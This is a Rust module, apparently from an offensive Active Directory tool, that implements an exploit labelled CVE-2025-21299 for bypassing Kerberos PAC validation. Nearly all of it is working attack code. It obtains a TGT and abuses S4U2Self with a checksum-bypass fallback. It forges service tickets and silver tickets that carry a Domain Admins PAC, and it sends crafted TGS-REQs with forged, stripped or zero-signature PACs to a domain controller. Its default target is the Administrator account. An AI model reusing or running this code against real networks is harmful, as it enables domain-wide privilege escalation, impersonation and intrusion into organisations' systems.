//! CVE-2025-21299 -- Kerberos PAC Bypass.
//!
//! # References
//! - CVE-2025-21299: CVSS 9.0, January 2025 Patch Tuesday

use kerberos_asn1::{
    ApReq, Asn1Object, KdcOptions, KdcReqBody, KerberosTime, PaData, PrincipalName, TgsRep, TgsReq,
};
use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::kerberos::{
    RequestTgtOptions, TicketGrantingData, build_encrypted_authenticator_with_authdata,
    build_pac_authdata_raw, forge_service_ticket, request_tgt_opsec, s4u2self,
    s4u2self_with_checksum_bypass,
};
use serde::{Deserialize, Serialize};

const DA_RID: u32 = 512;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KrbBypassConfig {
    pub dc_ip: String,
    pub domain: String,
    pub username: String,
    pub secret: String,
    pub use_hash: bool,
    pub target_spn: String,
    pub target_user: String,
    pub domain_sid: String,
    pub pac_handling: PacHandling,
    pub service_key_hex: Option<String>,
}

impl Default for KrbBypassConfig {
    fn default() -> Self {
        Self {
            dc_ip: String::new(),
            domain: String::new(),
            username: String::new(),
            secret: String::new(),
            use_hash: false,
            target_spn: String::new(),
            target_user: "Administrator".into(),
            domain_sid: String::new(),
            pac_handling: PacHandling::ModifyAndResign,
            service_key_hex: None,
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum PacHandling {
    ModifyAndResign,
    DirectForge,
    KdcAuthData,
    StripPac,
    ZeroSignature,
    ReplayPac,
}

impl std::fmt::Display for PacHandling {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::ModifyAndResign => write!(f, "ModifyAndResign"),
            Self::DirectForge => write!(f, "DirectForge"),
            Self::KdcAuthData => write!(f, "KdcAuthData"),
            Self::StripPac => write!(f, "StripPAC"),
            Self::ZeroSignature => write!(f, "ZeroSignature"),
            Self::ReplayPac => write!(f, "ReplayPAC"),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KrbBypassResult {
    pub technique: PacHandling,
    pub success: bool,
    pub target_user: String,
    pub target_spn: String,
    pub ticket_b64: Option<String>,
    pub kdc_error: Option<String>,
    pub summary: String,
    pub log: Vec<String>,
}

pub async fn exploit_krb_pac_bypass(config: &KrbBypassConfig) -> Result<KrbBypassResult> {
    let mut log = vec![format!(
        "CVE-2025-21299: user={}, spn={}, technique={}",
        config.target_user, config.target_spn, config.pac_handling
    )];
    match config.pac_handling {
        PacHandling::ModifyAndResign => modify_and_resign(config, &mut log).await,
        PacHandling::DirectForge => direct_forge(config, &mut log).await,
        PacHandling::KdcAuthData => kdc_authdata(config, &mut log).await,
        PacHandling::StripPac => strip_pac(config, &mut log).await,
        PacHandling::ZeroSignature => zero_signature(config, &mut log).await,
        PacHandling::ReplayPac => Ok(replay_pac(config, &mut log)),
    }
}

async fn get_tgt(config: &KrbBypassConfig, log: &mut Vec<String>) -> Result<TicketGrantingData> {
    log.push("Phase 1: Obtaining TGT...".to_string());
    let tgt = request_tgt_opsec(
        &config.dc_ip,
        &config.domain,
        &config.username,
        &config.secret,
        config.use_hash,
        &RequestTgtOptions::default(),
    )
    .await?;
    log.push(format!("  TGT: {}@{}", config.username, config.domain));
    Ok(tgt)
}

fn sid_or_default(config: &KrbBypassConfig) -> String {
    if config.domain_sid.is_empty() {
        "S-1-5-21-0-0-0".into()
    } else {
        config.domain_sid.clone()
    }
}

async fn modify_and_resign(
    config: &KrbBypassConfig,
    log: &mut Vec<String>,
) -> Result<KrbBypassResult> {
    let tgt = get_tgt(config, log).await?;
    log.push(format!("Phase 2: S4U2Self for {}...", config.target_user));
    let tgs = match s4u2self(&config.dc_ip, &tgt, &config.target_user).await {
        Ok(t) => t,
        Err(e) => {
            log.push(format!("  S4U2Self failed: {e}, trying checksum bypass"));
            let (t, _) = s4u2self_with_checksum_bypass(
                &config.dc_ip,
                &tgt,
                &config.target_user,
                Some(0xC0000000),
                None,
            )
            .await?;
            t
        }
    };
    let forged = forge_service_ticket(
        &config.domain,
        &sid_or_default(config),
        &config.target_user,
        DA_RID,
        &config.target_spn,
        &tgs.session_key,
        tgs.session_key_etype,
    )?;
    let b64 = base64::Engine::encode(
        &base64::engine::general_purpose::STANDARD,
        &forged.ticket.enc_part.cipher,
    );
    Ok(KrbBypassResult {
        technique: PacHandling::ModifyAndResign,
        success: true,
        target_user: config.target_user.clone(),
        target_spn: config.target_spn.clone(),
        ticket_b64: Some(b64),
        kdc_error: None,
        summary: format!(
            "Forged TGS {} -> {} with DA PAC",
            config.target_user, config.target_spn
        ),
        log: log.clone(),
    })
}

#[allow(clippy::ptr_arg)]
async fn direct_forge(config: &KrbBypassConfig, log: &mut Vec<String>) -> Result<KrbBypassResult> {
    let key = match &config.service_key_hex {
        Some(k) if !k.is_empty() => hex::decode(k).unwrap_or_else(|_| k.as_bytes().to_vec()),
        _ => {
            return Ok(KrbBypassResult {
                technique: PacHandling::DirectForge,
                success: false,
                target_user: config.target_user.clone(),
                target_spn: config.target_spn.clone(),
                ticket_b64: None,
                kdc_error: Some("No service key".into()),
                summary: "DirectForge needs service key (silver ticket)".into(),
                log: log.clone(),
            });
        }
    };
    let forged = forge_service_ticket(
        &config.domain,
        &sid_or_default(config),
        &config.target_user,
        DA_RID,
        &config.target_spn,
        &key,
        23,
    )?;
    let b64 = base64::Engine::encode(
        &base64::engine::general_purpose::STANDARD,
        &forged.ticket.enc_part.cipher,
    );
    Ok(KrbBypassResult {
        technique: PacHandling::DirectForge,
        success: true,
        target_user: config.target_user.clone(),
        target_spn: config.target_spn.clone(),
        ticket_b64: Some(b64),
        kdc_error: None,
        summary: format!(
            "Silver ticket {} -> {}",
            config.target_user, config.target_spn
        ),
        log: log.clone(),
    })
}

async fn do_tgs_req_with_authdata(
    config: &KrbBypassConfig,
    log: &mut Vec<String>,
    pac: Vec<u8>,
    label: &str,
) -> KrbBypassResult {
    let tgt = match get_tgt(config, log).await {
        Ok(t) => t,
        Err(e) => {
            return KrbBypassResult {
                technique: PacHandling::KdcAuthData,
                success: false,
                target_user: config.target_user.clone(),
                target_spn: config.target_spn.clone(),
                ticket_b64: None,
                kdc_error: Some(format!("TGT: {e}")),
                summary: format!("{label}: TGT failed: {e}"),
                log: log.clone(),
            };
        }
    };
    let auth_data = build_pac_authdata_raw(&pac);
    let enc_auth = match build_encrypted_authenticator_with_authdata(
        &tgt.client_realm,
        &tgt.client_principal,
        &tgt.session_key,
        tgt.session_key_etype,
        &auth_data,
    ) {
        Ok(e) => e,
        Err(e) => {
            return KrbBypassResult {
                technique: PacHandling::KdcAuthData,
                success: false,
                target_user: config.target_user.clone(),
                target_spn: config.target_spn.clone(),
                ticket_b64: None,
                kdc_error: Some(format!("Auth: {e}")),
                summary: format!("{label}: {e}"),
                log: log.clone(),
            };
        }
    };
    let ap_req = ApReq {
        pvno: 5,
        msg_type: 14,
        ap_options: KdcOptions::from(0u32),
        ticket: tgt.ticket,
        authenticator: enc_auth,
    };
    let pa_tgs = PaData {
        padata_type: 1,
        padata_value: ap_req.build(),
    };
    let spn_parts: Vec<&str> = config.target_spn.splitn(2, '/').collect();
    let sname = PrincipalName {
        name_type: 1,
        name_string: spn_parts.iter().map(|s| s.to_string()).collect(),
    };
    let now = chrono::Utc::now();
    let req_body = KdcReqBody {
        kdc_options: KdcOptions::from(0x40000000u32),
        cname: None,
        realm: config.domain.to_uppercase(),
        sname: Some(sname),
        from: None,
        till: KerberosTime::from(now + chrono::Duration::hours(10)),
        rtime: None,
        nonce: rand::random::<u32>(),
        etypes: vec![tgt.session_key_etype],
        addresses: None,
        enc_authorization_data: None,
        additional_tickets: None,
    };
    let tgs_req = TgsReq {
        pvno: 5,
        msg_type: 12,
        padata: Some(vec![pa_tgs]),
        req_body,
    };

    log.push(format!("  Sending TGS-REQ ({label})..."));
    match kdc_raw_exchange(&config.dc_ip, &tgs_req.build()).await {
        Ok(resp) => match TgsRep::parse(&resp) {
            Ok((_, rep)) => {
                let b64 = base64::Engine::encode(
                    &base64::engine::general_purpose::STANDARD,
                    &rep.ticket.enc_part.cipher,
                );
                KrbBypassResult {
                    technique: PacHandling::KdcAuthData,
                    success: true,
                    target_user: config.target_user.clone(),
                    target_spn: config.target_spn.clone(),
                    ticket_b64: Some(b64),
                    kdc_error: None,
                    summary: format!("{label} -- KDC issued TGS"),
                    log: log.clone(),
                }
            }
            Err(e) => KrbBypassResult {
                technique: PacHandling::KdcAuthData,
                success: false,
                target_user: config.target_user.clone(),
                target_spn: config.target_spn.clone(),
                ticket_b64: None,
                kdc_error: Some(format!("Parse: {e}")),
                summary: format!("{label}: parse error: {e}"),
                log: log.clone(),
            },
        },
        Err(e) => KrbBypassResult {
            technique: PacHandling::KdcAuthData,
            success: false,
            target_user: config.target_user.clone(),
            target_spn: config.target_spn.clone(),
            ticket_b64: None,
            kdc_error: Some(format!("KDC: {e}")),
            summary: format!("{label}: KDC error: {e}"),
            log: log.clone(),
        },
    }
}

async fn kdc_authdata(config: &KrbBypassConfig, log: &mut Vec<String>) -> Result<KrbBypassResult> {
    let pac = build_pac(
        &sid_or_default(config),
        &config.target_user,
        DA_RID,
        &config.domain.to_uppercase(),
    );
    Ok(do_tgs_req_with_authdata(config, log, pac, "KdcAuthData").await)
}

async fn strip_pac(config: &KrbBypassConfig, log: &mut Vec<String>) -> Result<KrbBypassResult> {
    let pac = build_pac(
        &sid_or_default(config),
        &config.target_user,
        0,
        &config.domain.to_uppercase(),
    );
    Ok(do_tgs_req_with_authdata(config, log, pac, "StripPAC").await)
}

async fn zero_signature(
    config: &KrbBypassConfig,
    log: &mut Vec<String>,
) -> Result<KrbBypassResult> {
    let mut pac = build_pac(
        &sid_or_default(config),
        &config.target_user,
        DA_RID,
        &config.domain.to_uppercase(),
    );
    if pac.len() > 32 {
        let sz = pac.len();
        for b in pac[sz - 32..].iter_mut() {
            *b = 0;
        }
    }
    let pac_final = pac;
    Ok(do_tgs_req_with_authdata(config, log, pac_final, "ZeroSignature").await)
}

fn replay_pac(config: &KrbBypassConfig, log: &mut Vec<String>) -> KrbBypassResult {
    log.push("ReplayPAC needs DA ticket capture -- try ModifyAndResign".to_string());
    KrbBypassResult {
        technique: PacHandling::ReplayPac,
        success: false,
        target_user: config.target_user.clone(),
        target_spn: config.target_spn.clone(),
        ticket_b64: None,
        kdc_error: None,
        summary: "ReplayPAC not implemented".into(),
        log: log.clone(),
    }
}

async fn kdc_raw_exchange(dc_ip: &str, req: &[u8]) -> Result<Vec<u8>> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::net::TcpStream;
    let addr: std::net::SocketAddr = format!("{dc_ip}:88")
        .parse()
        .map_err(|e| OverthroneError::Kerberos(format!("Bad addr: {e}")))?;
    let mut stream =
        tokio::time::timeout(std::time::Duration::from_secs(15), TcpStream::connect(addr))
            .await
            .map_err(|_| OverthroneError::Kerberos("KDC timeout".into()))?
            .map_err(|e| OverthroneError::Kerberos(format!("KDC connect: {e}")))?;

    let len = req.len() as u32;
    let mut framed = len.to_be_bytes().to_vec();
    framed.extend_from_slice(req);
    stream
        .write_all(&framed)
        .await
        .map_err(|e| OverthroneError::Kerberos(format!("KDC send: {e}")))?;
    stream.flush().await.ok();
    let mut lb = [0u8; 4];
    stream
        .read_exact(&mut lb)
        .await
        .map_err(|e| OverthroneError::Kerberos(format!("KDC recv len: {e}")))?;
    let rl = u32::from_be_bytes(lb) as usize;
    let mut resp = vec![0u8; rl];
    stream
        .read_exact(&mut resp)
        .await
        .map_err(|e| OverthroneError::Kerberos(format!("KDC recv data: {e}")))?;
    Ok(resp)
}

fn build_pac(domain_sid: &str, username: &str, user_rid: u32, realm: &str) -> Vec<u8> {
    let logon = build_logon_info(domain_sid, username, user_rid, realm);
    let header_sz = 8 + 16;
    let mut padded = logon;
    while !padded.len().is_multiple_of(8) {
        padded.push(0);
    }
    let mut pac = Vec::new();
    pac.extend_from_slice(&1u32.to_le_bytes());
    pac.extend_from_slice(&0u32.to_le_bytes());
    pac.extend_from_slice(&1u32.to_le_bytes());
    pac.extend_from_slice(&(padded.len() as u32).to_le_bytes());
    pac.extend_from_slice(&(header_sz as u64).to_le_bytes());
    pac.extend_from_slice(&padded);
    pac
}

fn build_logon_info(_dsid: &str, _user: &str, rid: u32, _realm: &str) -> Vec<u8> {
    let mut d = Vec::new();
    d.extend_from_slice(&[0u8; 40]);
    d.extend_from_slice(&[0u8; 8]);
    d.extend_from_slice(&[0u8; 4]);
    for _ in 0..5 {
        d.extend_from_slice(&[0u8; 4]);
    }
    d.extend_from_slice(&10u16.to_le_bytes());
    d.extend_from_slice(&0u16.to_le_bytes());
    d.extend_from_slice(&rid.to_le_bytes());
    d.extend_from_slice(&DA_RID.to_le_bytes());
    d.extend_from_slice(&1u32.to_le_bytes());
    d.extend_from_slice(&DA_RID.to_le_bytes());
    d.extend_from_slice(&7u32.to_le_bytes());
    d.extend_from_slice(&0u32.to_le_bytes());
    d.extend_from_slice(&[0u8; 16]);
    d.extend_from_slice(&[0u8; 4]);
    d.extend_from_slice(&[0u8; 4]);
    d.extend_from_slice(&0u32.to_le_bytes());
    d.extend_from_slice(&0u32.to_le_bytes());
    d.extend_from_slice(&0u32.to_le_bytes());
    d.push(1u8);
    d.push(4u8);
    d.extend_from_slice(&[0u8, 0, 0, 0, 0, 5]);
    for &sa in &[21u32, 0, 0, 0] {
        d.extend_from_slice(&sa.to_le_bytes());
    }
    d
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn test_pac_handling_display() {
        assert_eq!(PacHandling::ModifyAndResign.to_string(), "ModifyAndResign");
    }
    #[test]
    fn test_config_default() {
        let c = KrbBypassConfig::default();
        assert_eq!(c.target_user, "Administrator");
    }
    #[test]
    fn test_result_serde() {
        let r = KrbBypassResult {
            technique: PacHandling::KdcAuthData,
            success: true,
            target_user: "A".into(),
            target_spn: "spn".into(),
            ticket_b64: Some("b64".into()),
            kdc_error: None,
            summary: "ok".into(),
            log: vec!["s1".into()],
        };
        let j = serde_json::to_string(&r).unwrap();
        assert!(j.contains("KdcAuthData"));
        let d: KrbBypassResult = serde_json::from_str(&j).unwrap();
        assert!(d.success);
    }
    #[test]
    fn test_pac_bytes() {
        let p = build_pac("S-1-5-21-100", "admin", 500, "CORP");
        assert!(p.len() > 24);
        assert_eq!(&p[0..4], &1u32.to_le_bytes());
    }
}
